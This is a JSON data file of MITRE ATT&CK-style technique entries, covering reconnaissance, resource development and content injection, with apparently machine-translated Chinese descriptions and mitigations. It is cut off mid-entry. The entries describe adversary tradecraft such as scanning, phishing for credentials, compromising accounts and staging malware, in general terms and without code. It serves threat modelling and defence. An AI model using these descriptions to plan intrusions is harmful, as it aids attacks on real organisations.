[
    {
        "id": "T1595",
        "name": "Active Scanning",
        "tactics": [
            {
                "id": "TA0043",
                "name": "Reconnaissance"
            }
        ],
        "subs": [
            {
                "id": "T1595.001",
                "name": "Scanning IP Blocks"
            },
            {
                "id": "T1595.002",
                "name": "Vulnerability Scanning"
            },
            {
                "id": "T1595.003",
                "name": "Wordlist Scanning"
            }
        ],
        "version": "1.0",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可以执行主动侦察扫描，以收集可在瞄准过程中使用的信息。主动扫描是指对手通过网络流量探测受害者基础设施的扫描，而不是不涉及直接交互的其他形式的侦察。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可能会根据他们想要收集的信息进行不同形式的主动扫描。这些扫描也可以以各种方式执行，包括使用网络协议（如ICMP）的本地功能。这些扫描的信息可能揭示其他形式的侦察（例如：搜索开放网站/域或搜索开放技术数据库）、建立作战资源（例如：开发能力或获得能力）和/或初始访问（例如：外部远程服务或利用面向公众的应用程序）的机会。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1056",
                "name": "妥协前",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "这种技术无法通过预防性控制轻易缓解，因为它是基于在企业防御和控制范围之外执行的行为。应将工作重点放在尽量减少可供外部各方使用的数据的数量和敏感性上。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1592",
        "name": "Gather Victim Host Information",
        "tactics": [
            {
                "id": "TA0043",
                "name": "Reconnaissance"
            }
        ],
        "subs": [
            {
                "id": "T1592.001",
                "name": "Hardware"
            },
            {
                "id": "T1592.002",
                "name": "Software"
            },
            {
                "id": "T1592.003",
                "name": "Firmware"
            },
            {
                "id": "T1592.004",
                "name": "Client Configurations"
            }
        ],
        "version": "1.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会收集有关受害者宿主的信息，这些信息可以在瞄准过程中使用。关于主机的信息可以包括各种细节，包括管理数据（例如：名称、分配的IP、功能等）以及关于其配置的细节（例如：操作系统、语言等）。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可以通过各种方式收集这些信息，例如通过主动扫描或网络钓鱼进行直接收集。敌人也可能危害网站，然后包括旨在从访问者那里收集主机信息的恶意内容。关于主机的信息也可能通过在线或其他可访问的数据集（例如：社交媒体或搜索受害者拥有的网站）暴露给对手。收集这些信息可能会揭示其他形式的侦察（例如：搜索开放网站/域或搜索开放技术数据库）、建立作战资源（例如：开发能力或获得能力）和/或初始访问（例如：供应链妥协或外部远程服务）的机会。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1056",
                "name": "妥协前",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "这种技术无法通过预防性控制轻易缓解，因为它是基于在企业防御和控制范围之外执行的行为。应将工作重点放在尽量减少可供外部各方使用的数据的数量和敏感性上。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1589",
        "name": "Gather Victim Identity Information",
        "tactics": [
            {
                "id": "TA0043",
                "name": "Reconnaissance"
            }
        ],
        "subs": [
            {
                "id": "T1589.001",
                "name": "Credentials"
            },
            {
                "id": "T1589.002",
                "name": "Email Addresses"
            },
            {
                "id": "T1589.003",
                "name": "Employee Names"
            }
        ],
        "version": "1.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会收集有关受害者身份的信息，这些信息可以在瞄准过程中使用。关于身份的信息可能包括各种细节，包括个人数据（例如：员工姓名、电子邮件地址等）以及凭据等敏感细节。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可以通过各种方式收集这些信息，例如通过网络钓鱼获取信息的直接启发。还可以通过其他主动方式（即主动扫描）枚举关于用户的信息，例如探测和分析来自认证服务的响应，这些响应可以揭示系统中的有效用户名。有关受害者的信息也可能通过在线或其他可访问的数据集（例如：社交媒体或搜索受害者所有的网站）暴露给对手。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "收集这些信息可能会发现其他形式的侦察（例如：搜索开放网站/域或网络钓鱼信息）、建立运营资源（例如：泄露账户）和/或初始访问（例如：网络钓鱼或有效账户）的机会。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1056",
                "name": "妥协前",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "这种技术无法通过预防性控制轻易缓解，因为它是基于在企业防御和控制范围之外执行的行为。应将工作重点放在尽量减少可供外部各方使用的数据的数量和敏感性上。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1590",
        "name": "Gather Victim Network Information",
        "tactics": [
            {
                "id": "TA0043",
                "name": "Reconnaissance"
            }
        ],
        "subs": [
            {
                "id": "T1590.001",
                "name": "Domain Properties"
            },
            {
                "id": "T1590.002",
                "name": "DNS"
            },
            {
                "id": "T1590.003",
                "name": "Network Trust Dependencies"
            },
            {
                "id": "T1590.004",
                "name": "Network Topology"
            },
            {
                "id": "T1590.005",
                "name": "IP Addresses"
            },
            {
                "id": "T1590.006",
                "name": "Network Security Appliances"
            }
        ],
        "version": "1.0",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会收集有关受害者网络的信息，这些信息可以在瞄准过程中使用。关于网络的信息可以包括各种细节，包括管理数据（例如：IP范围、域名等）以及关于其拓扑和操作的细节。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可以通过各种方式收集这些信息，例如通过主动扫描或网络钓鱼进行直接收集。有关网络的信息也可能通过在线或其他可访问的数据集（例如：搜索开放技术数据库）暴露给对手。收集这些信息可能会揭示其他形式的侦察（例如：主动扫描或搜索开放网站/域）、建立运营资源（例如：获取基础设施或破坏基础设施）和/或初始访问（例如：可信关系）的机会。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1056",
                "name": "妥协前",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "这种技术无法通过预防性控制轻易缓解，因为它是基于在企业防御和控制范围之外执行的行为。应将工作重点放在尽量减少可供外部各方使用的数据的数量和敏感性上。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1591",
        "name": "Gather Victim Org Information",
        "tactics": [
            {
                "id": "TA0043",
                "name": "Reconnaissance"
            }
        ],
        "subs": [
            {
                "id": "T1591.001",
                "name": "Determine Physical Locations"
            },
            {
                "id": "T1591.002",
                "name": "Business Relationships"
            },
            {
                "id": "T1591.003",
                "name": "Identify Business Tempo"
            },
            {
                "id": "T1591.004",
                "name": "Identify Roles"
            }
        ],
        "version": "1.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会收集有关受害者组织的信息，这些信息可以在瞄准过程中使用。关于组织的信息可能包括各种细节，包括部门/部门的名称、业务运营的细节以及关键员工的角色和责任。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可以通过各种方式收集这些信息，例如通过网络钓鱼获取信息的直接启发。有关组织的信息也可能通过在线或其他可访问的数据集（例如：社交媒体或搜索受害者拥有的网站）暴露给对手。收集这些信息可能会发现其他形式的侦察（例如：网络钓鱼获取信息或搜索开放网站/域）、建立运营资源（例如：建立账户或泄露账户）和/或初始访问（例如：互联网钓鱼或可信关系）的机会。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1056",
                "name": "妥协前",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "这种技术无法通过预防性控制轻易缓解，因为它是基于在企业防御和控制范围之外执行的行为。应将工作重点放在尽量减少可供外部各方使用的数据的数量和敏感性上。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1598",
        "name": "Phishing for Information",
        "tactics": [
            {
                "id": "TA0043",
                "name": "Reconnaissance"
            }
        ],
        "subs": [
            {
                "id": "T1598.001",
                "name": "Spearphishing Service"
            },
            {
                "id": "T1598.002",
                "name": "Spearphishing Attachment"
            },
            {
                "id": "T1598.003",
                "name": "Spearphishing Link"
            },
            {
                "id": "T1598.004",
                "name": "Spearphishing Voice"
            }
        ],
        "version": "1.3",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会发送网络钓鱼消息，以获取可在锁定目标时使用的敏感信息。网络钓鱼是一种试图诱骗目标泄露信息、经常是凭据或其他可操作信息的行为。信息网络钓鱼与网络钓鱼的不同之处在于，其目的是从受害者那里收集数据，而不是执行恶意代码。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "所有形式的网络钓鱼都是以电子方式提供的社会工程。网络钓鱼可以成为攻击目标，称为鱼叉式网络钓鱼。在鱼叉式网络钓鱼中，特定的个人、公司或行业将成为对手的目标。更普遍地说，对手可以进行非针对性的网络钓鱼，例如在大规模的凭据收集活动中。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对手也可能试图通过电子邮件、即时消息或其他电子对话手段直接获取信息。受害者还可能收到钓鱼信息，指示他们拨打对手试图收集机密信息的电话号码。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "网络钓鱼通常涉及社会工程技术，例如冒充有理由收集信息的来源（例如：建立账户或泄露账户）和/或发送多条看似紧急的消息。另一种实现这一点的方法是伪造或伪造发送者的身份，这可以用来欺骗人类接收者和自动安全工具。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "信息钓鱼还可能涉及规避技术，例如从被滥用发送消息的受损帐户中删除或操纵电子邮件或元数据/标头（例如，电子邮件隐藏规则）。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1054",
                "name": "软件配置",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用反欺骗和电子邮件身份验证机制，根据发件人域的有效性检查（使用SPF）和邮件的完整性（使用DKIM）过滤邮件。在组织内启用这些机制（通过DMARC等策略）可以使收件人（组织内和跨域）执行类似的消息过滤和验证。"
                        }
                    ]
                ]
            },
            {
                "id": "M1017",
                "name": "用户培训",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "可以对用户进行培训，以识别社会工程技术和鱼叉式网络钓鱼企图。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1597",
        "name": "Search Closed Sources",
        "tactics": [
            {
                "id": "TA0043",
                "name": "Reconnaissance"
            }
        ],
        "subs": [
            {
                "id": "T1597.001",
                "name": "Threat Intel Vendors"
            },
            {
                "id": "T1597.002",
                "name": "Purchase Technical Data"
            }
        ],
        "version": "1.0",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可以从封闭的来源搜索和收集受害者的信息，这些信息可以在瞄准过程中使用。关于受害者的信息可以从信誉良好的私人来源和数据库购买，例如技术/威胁情报数据的付费订阅。敌人也可能从信誉较差的来源购买信息，如暗网或网络犯罪黑市。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可能会根据他们想要收集的信息在不同的封闭数据库中进行搜索。来自这些来源的信息可能揭示其他形式的侦察（例如：网络钓鱼或搜索开放网站/域）、建立运营资源（例如：开发能力或获得能力）和/或初始访问（例如：外部远程服务或有效帐户）的机会。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1056",
                "name": "妥协前",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "这种技术无法通过预防性控制轻易缓解，因为它是基于在企业防御和控制范围之外执行的行为。应将工作重点放在尽量减少可供外部各方使用的数据的数量和敏感性上。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1596",
        "name": "Search Open Technical Databases",
        "tactics": [
            {
                "id": "TA0043",
                "name": "Reconnaissance"
            }
        ],
        "subs": [
            {
                "id": "T1596.001",
                "name": "DNS/Passive DNS"
            },
            {
                "id": "T1596.002",
                "name": "WHOIS"
            },
            {
                "id": "T1596.003",
                "name": "Digital Certificates"
            },
            {
                "id": "T1596.004",
                "name": "CDNs"
            },
            {
                "id": "T1596.005",
                "name": "Scan Databases"
            }
        ],
        "version": "1.0",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可以在免费提供的技术数据库中搜索可以在瞄准过程中使用的受害者信息。关于受害者的信息可以在在线数据库和存储库中获得，例如域/证书的注册以及从流量和/或扫描中收集的网络数据/工件的公共集合。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可能会根据他们想要收集的信息在不同的开放数据库中进行搜索。来自这些来源的信息可能揭示其他形式的侦察（例如：网络钓鱼或搜索开放网站/域）、建立运营资源（例如：获取基础设施或破坏基础设施）和/或初始访问（例如：外部远程服务或可信关系）的机会。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1056",
                "name": "妥协前",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "这种技术无法通过预防性控制轻易缓解，因为它是基于在企业防御和控制范围之外执行的行为。应将工作重点放在尽量减少可供外部各方使用的数据的数量和敏感性上。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1593",
        "name": "Search Open Websites/Domains",
        "tactics": [
            {
                "id": "TA0043",
                "name": "Reconnaissance"
            }
        ],
        "subs": [
            {
                "id": "T1593.001",
                "name": "Social Media"
            },
            {
                "id": "T1593.002",
                "name": "Search Engines"
            },
            {
                "id": "T1593.003",
                "name": "Code Repositories"
            }
        ],
        "version": "1.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可以在免费提供的网站和/或域中搜索可以在瞄准过程中使用的受害者信息。关于受害者的信息可以在各种在线网站上获得，如社交媒体、新网站，或那些托管商业运营信息的网站，如招聘或请求/奖励合同。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可能会根据他们想要收集的信息在不同的网站上搜索。来自这些来源的信息可能揭示其他形式的侦察（例如：信息网络钓鱼或搜索开放技术数据库）、建立运营资源（例如：建立账户或泄露账户）和/或初始访问（例如：外部远程服务或网络钓鱼）的机会。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1013",
                "name": "应用程序开发人员指南",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "上传到公共代码存储库的应用程序开发人员应小心避免发布凭据和API密钥等敏感信息。"
                        }
                    ]
                ]
            },
            {
                "id": "M1047",
                "name": "审计",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "在进行提交之前，扫描公共代码存储库中暴露的凭据或其他敏感信息。确保从提交历史记录中删除任何泄露的凭据，而不仅仅是当前最新版本的代码。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1594",
        "name": "Search Victim-Owned Websites",
        "tactics": [
            {
                "id": "TA0043",
                "name": "Reconnaissance"
            }
        ],
        "subs": [],
        "version": "1.0",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会在受害者拥有的网站上搜索可在瞄准过程中使用的信息。受害者拥有的网站可能包含各种详细信息，包括部门/部门的名称、实际位置以及关键员工的数据，如姓名、角色和联系信息（例如：电子邮件地址）。这些网站也可能有突出业务运营和关系的详细信息。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可能会搜索受害者拥有的网站，以收集可操作的信息。来自这些来源的信息可能揭示其他形式的侦察（例如：信息网络钓鱼或搜索开放技术数据库）、建立运营资源（例如：建立账户或泄露账户）和/或初始访问（例如：可信关系或网络钓鱼）的机会。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1056",
                "name": "妥协前",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "这种技术无法通过预防性控制轻易缓解，因为它是基于在企业防御和控制范围之外执行的行为。应将工作重点放在尽量减少可供外部各方使用的数据的数量和敏感性上。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1650",
        "name": "Acquire Access",
        "tactics": [
            {
                "id": "TA0042",
                "name": "Resource Development"
            }
        ],
        "subs": [],
        "version": "1.0",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可以购买或以其他方式获得对目标系统或网络的现有访问。各种在线服务和初始访问代理网络可用于出售对先前受损系统的访问。在某些情况下，敌对团体可能会结成伙伴关系，相互共享受损的系统。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对受损系统的立足点可以采取多种形式，例如访问植入的后门（例如Web Shell）或通过外部远程服务建立的访问权限。在某些情况下，访问代理会向受损的系统植入“负载”，用于为付费客户安装额外的恶意软件。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "通过利用现有的接入代理网络，而不是开发或获得自己的初始接入能力，对手可以潜在地减少在目标网络上站稳脚跟所需的资源，并将精力集中在后期的妥协阶段。对手可能会优先获得对已确定缺乏安全监控或具有高特权的系统或属于特定部门组织的系统的访问权限。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在某些情况下，购买对IT合同、软件开发或电信等部门组织的访问权限，可能会使对手通过可信关系、多因素身份验证拦截，甚至供应链泄露，危及其他受害者。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "注意：虽然这项技术不同于其他行为，如购买技术数据和凭证，但它们可能经常结合使用（尤其是在获得的立足点需要有效账户的情况下）。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1056",
                "name": "妥协前",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "这种技术无法通过预防性控制轻易缓解，因为它是基于在企业防御和控制范围之外执行的行为。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1583",
        "name": "Acquire Infrastructure",
        "tactics": [
            {
                "id": "TA0042",
                "name": "Resource Development"
            }
        ],
        "subs": [
            {
                "id": "T1583.001",
                "name": "Domains"
            },
            {
                "id": "T1583.002",
                "name": "DNS Server"
            },
            {
                "id": "T1583.003",
                "name": "Virtual Private Server"
            },
            {
                "id": "T1583.004",
                "name": "Server"
            },
            {
                "id": "T1583.005",
                "name": "Botnet"
            },
            {
                "id": "T1583.006",
                "name": "Web Services"
            },
            {
                "id": "T1583.007",
                "name": "Serverless"
            },
            {
                "id": "T1583.008",
                "name": "Malvertising"
            }
        ],
        "version": "1.3",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可以购买、租赁或租用可在瞄准过程中使用的基础设施。存在各种各样的基础设施，用于托管和协调对手的行动。基础设施解决方案包括物理或云服务器、域和第三方web服务。此外，僵尸网络可供出租或购买。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "这些基础设施解决方案的使用使对手能够策划、发动和执行行动。解决方案可以帮助对手的行动融入正常的流量，例如联系第三方网络服务或获取支持代理的基础设施，包括来自住宅代理服务的基础设施。根据实施情况，对手可能会使用难以物理连接的基础设施，也可能会使用可以快速配置、修改和关闭的基础设施。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1056",
                "name": "妥协前",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "这种技术无法通过预防性控制轻易缓解，因为它是基于在企业防御和控制范围之外执行的行为。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1586",
        "name": "Compromise Accounts",
        "tactics": [
            {
                "id": "TA0042",
                "name": "Resource Development"
            }
        ],
        "subs": [
            {
                "id": "T1586.001",
                "name": "Social Media Accounts"
            },
            {
                "id": "T1586.002",
                "name": "Email Accounts"
            },
            {
                "id": "T1586.003",
                "name": "Cloud Accounts"
            }
        ],
        "version": "1.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会利用可在瞄准过程中使用的服务危害帐户。对于包含社会工程的操作，在线角色的使用可能很重要。对手可能会破坏现有账户，而不是创建和培养账户（即建立账户）。如果潜在受害者与受损的角色有关系或了解，那么利用现有的角色可能会对他们产生一定程度的信任。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "存在多种危害帐户的方法，如通过网络钓鱼获取信息收集凭据、从第三方网站购买凭据、暴力强制凭据（例如：从违规凭据转储中重复使用密码），或向员工、供应商或业务合作伙伴支付访问凭据的费用。在泄露账户之前，对手可以进行侦察，以决定要泄露哪些账户，从而推进其行动。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "人物角色可能存在于单个网站或多个网站（例如：Facebook、LinkedIn、Twitter、Google等）。受损的账户可能需要额外开发，包括填写或修改个人资料信息、进一步开发社交网络或合并照片。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可能会直接利用受损的电子邮件帐户进行信息网络钓鱼或网络钓鱼。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1056",
                "name": "妥协前",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "这种技术无法通过预防性控制轻易缓解，因为它是基于在企业防御和控制范围之外执行的行为。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1584",
        "name": "Compromise Infrastructure",
        "tactics": [
            {
                "id": "TA0042",
                "name": "Resource Development"
            }
        ],
        "subs": [
            {
                "id": "T1584.001",
                "name": "Domains"
            },
            {
                "id": "T1584.002",
                "name": "DNS Server"
            },
            {
                "id": "T1584.003",
                "name": "Virtual Private Server"
            },
            {
                "id": "T1584.004",
                "name": "Server"
            },
            {
                "id": "T1584.005",
                "name": "Botnet"
            },
            {
                "id": "T1584.006",
                "name": "Web Services"
            },
            {
                "id": "T1584.007",
                "name": "Serverless"
            }
        ],
        "version": "1.4",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会破坏可在瞄准过程中使用的第三方基础设施。基础设施解决方案包括物理或云服务器、域以及第三方web和DNS服务。对手可能会破坏基础设施，并在对手生命周期的其他阶段使用它，而不是购买、租赁或租赁基础设施。此外，对手可能会破坏许多机器，形成他们可以利用的僵尸网络。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "使用受损的基础设施使对手能够策划、发动和执行行动。受损的基础设施可以帮助对手的行动融入正常的流量，例如与高声誉或可信网站的联系。例如，对手可能会利用受损的基础设施（也可能与数字证书结合使用）进一步融入并支持分阶段的信息收集和/或网络钓鱼活动。此外，对手还可能破坏支持代理和/或代理墙服务的基础设施。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "通过使用受损的基础设施，对手可能很难将自己的行动与之联系起来。在瞄准之前，对手可能会破坏其他对手的基础设施。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1056",
                "name": "妥协前",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "这种技术无法通过预防性控制轻易缓解，因为它是基于在企业防御和控制范围之外执行的行为。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1587",
        "name": "Develop Capabilities",
        "tactics": [
            {
                "id": "TA0042",
                "name": "Resource Development"
            }
        ],
        "subs": [
            {
                "id": "T1587.001",
                "name": "Malware"
            },
            {
                "id": "T1587.002",
                "name": "Code Signing Certificates"
            },
            {
                "id": "T1587.003",
                "name": "Digital Certificates"
            },
            {
                "id": "T1587.004",
                "name": "Exploits"
            }
        ],
        "version": "1.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可以建立可在瞄准过程中使用的能力。对手可以在内部开发自己的能力，而不是购买、免费下载或窃取能力。这是识别开发需求和构建解决方案的过程，如恶意软件、漏洞利用和自签名证书。敌方可以发展能力，在敌方生命周期的许多阶段支持其作战。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "与合法的开发工作一样，开发能力可能需要不同的技能。所需技能可能位于内部，也可能需要外包。使用承包商可以被视为对手开发能力的延伸，前提是对手在形成需求方面发挥作用，并保持一定程度的能力排他性。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1056",
                "name": "妥协前",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "这种技术无法通过预防性控制轻易缓解，因为它是基于在企业防御和控制范围之外执行的行为。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1585",
        "name": "Establish Accounts",
        "tactics": [
            {
                "id": "TA0042",
                "name": "Resource Development"
            }
        ],
        "subs": [
            {
                "id": "T1585.001",
                "name": "Social Media Accounts"
            },
            {
                "id": "T1585.002",
                "name": "Email Accounts"
            },
            {
                "id": "T1585.003",
                "name": "Cloud Accounts"
            }
        ],
        "version": "1.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会创建和培养具有可在瞄准过程中使用的服务的帐户。敌人可以创建可用于建立角色以进行进一步操作的帐户。人格发展包括公共信息、存在、历史和适当隶属关系的发展。这一发展可以应用于社交媒体、网站或其他公开信息，这些信息可以在使用该人物或身份的行动过程中被引用和审查其合法性。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对于包含社会工程的操作，在线角色的使用可能很重要。这些人物角色可能是虚构的，也可能模仿真人。角色可能存在于单个网站或多个网站（例如：Facebook、LinkedIn、Twitter、Google、GitHub、Docker Hub等）。建立角色可能需要开发额外的文档，使其看起来真实。这可能包括填写个人资料信息、开发社交网络或合并照片。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "建立帐户还可以包括与电子邮件提供商创建帐户，这些帐户可以直接用于信息网络钓鱼或网络钓鱼。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1056",
                "name": "妥协前",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "这种技术无法通过预防性控制轻易缓解，因为它是基于在企业防御和控制范围之外执行的行为。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1588",
        "name": "Obtain Capabilities",
        "tactics": [
            {
                "id": "TA0042",
                "name": "Resource Development"
            }
        ],
        "subs": [
            {
                "id": "T1588.001",
                "name": "Malware"
            },
            {
                "id": "T1588.002",
                "name": "Tool"
            },
            {
                "id": "T1588.003",
                "name": "Code Signing Certificates"
            },
            {
                "id": "T1588.004",
                "name": "Digital Certificates"
            },
            {
                "id": "T1588.005",
                "name": "Exploits"
            },
            {
                "id": "T1588.006",
                "name": "Vulnerabilities"
            }
        ],
        "version": "1.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会购买和/或窃取可在瞄准过程中使用的能力。对手可能会购买、免费下载或窃取它们，而不是在内部开发自己的能力。活动可能包括获取恶意软件、软件（包括许可证）、漏洞利用、证书和与漏洞相关的信息。敌人可以在其生命周期的许多阶段获得支持其作战的能力。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "除了从互联网上下载免费的恶意软件、软件和漏洞外，对手还可以从第三方实体购买这些功能。第三方实体可以包括专门从事恶意软件和漏洞利用、犯罪市场或个人的技术公司。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "除了购买能力外，对手还可能从第三方实体（包括其他对手）窃取能力。这可能包括窃取软件许可证、恶意软件、SSL/TLS和代码签名证书，或突袭漏洞或漏洞利用的封闭数据库。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1056",
                "name": "妥协前",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "这种技术无法通过预防性控制轻易缓解，因为它是基于在企业防御和控制范围之外执行的行为。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1608",
        "name": "Stage Capabilities",
        "tactics": [
            {
                "id": "TA0042",
                "name": "Resource Development"
            }
        ],
        "subs": [
            {
                "id": "T1608.001",
                "name": "Upload Malware"
            },
            {
                "id": "T1608.002",
                "name": "Upload Tool"
            },
            {
                "id": "T1608.003",
                "name": "Install Digital Certificate"
            },
            {
                "id": "T1608.004",
                "name": "Drive-by Target"
            },
            {
                "id": "T1608.005",
                "name": "Link Target"
            },
            {
                "id": "T1608.006",
                "name": "SEO Poisoning"
            }
        ],
        "version": "1.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可以上传、安装或以其他方式设置可在瞄准过程中使用的功能。为了支持他们的行动，对手可能需要获得他们开发的（发展能力）或获得的（获得能力）能力，并将其部署在他们控制的基础设施上。这些能力可以在对手之前购买/租用的基础设施上进行部署（获取基础设施），或者在其他方面受到对手的损害（损害基础设施）。功能也可以在web服务上部署，如GitHub或Pastebin，或在平台即服务（PaaS）产品上部署，使用户可以轻松地配置应用程序。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "能力的分级可以帮助对手进行一些初始访问和妥协后的行为，包括（但不限于）："
                }
            ],
            [
                {
                    "type": "list",
                    "content": "当用户浏览到某个网站时，暂存执行“按妥协驱动”所需的web资源。"
                },
                {
                    "type": "list",
                    "content": "正在暂存链接目标的web资源，以便与鱼叉式网络钓鱼一起使用。"
                },
                {
                    "type": "list",
                    "content": "将恶意软件或工具上传到受害者网络可访问的位置，以启用Ingress Tool Transfer。"
                },
                {
                    "type": "list",
                    "content": "安装以前获取的SSL/TLS证书以用于加密命令和控制流量（例如：使用Web协议的不对称加密）。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1056",
                "name": "妥协前",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "这种技术无法通过预防性控制轻易缓解，因为它是基于在企业防御和控制范围之外执行的行为。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1659",
        "name": "Content Injection",
        "tactics": [
            {
                "id": "TA0001",
                "name": "Initial Access"
            },
            {
                "id": "TA0011",
                "name": "Command and Control"
            }
        ],
        "subs": [],
        "version": "1.0",
        "description": [
            [
                {
                    "type": "text",
                    "content": "攻击者可以通过在线网络流量将恶意内容注入系统，从而获得访问权限并与受害者持续通信。与其引诱受害者使用受损网站上托管的恶意有效载荷（即先按目标驱动，然后按妥协驱动），对手最初可能会通过受损的数据传输渠道访问受害者，在那里他们可以操纵流量和/或注入自己的内容。这些受损的在线网络信道也可以用于向已经受损的系统递送额外的有效载荷（即，入口工具传输）和其他数据。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可以通过各种方式向受害者系统注入内容，包括："
                }
            ],
            [
                {
                    "type": "list",
                    "content": "从中间开始，对手处于合法的在线客户端-服务器通信之间（注意：这与中间的对手类似但不同，后者仅描述企业环境中的AiTM活动）"
                },
                {
                    "type": "list",
                    "content": "从侧面看，恶意内容被注入并作为对合法在线服务器请求的虚假响应与客户端竞争"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "内容注入通常是上游通信渠道受损的结果，例如在互联网服务提供商（ISP）层面，“合法拦截”就是如此"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1041",
                "name": "加密敏感信息",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "在可能的情况下，确保通过可信VPN等服务对在线流量进行适当加密。"
                        }
                    ]
                ]
            },
            {
                "id": "M1021",
                "name": "限制基于Web的内容",
                "description": [
                    [
                        {
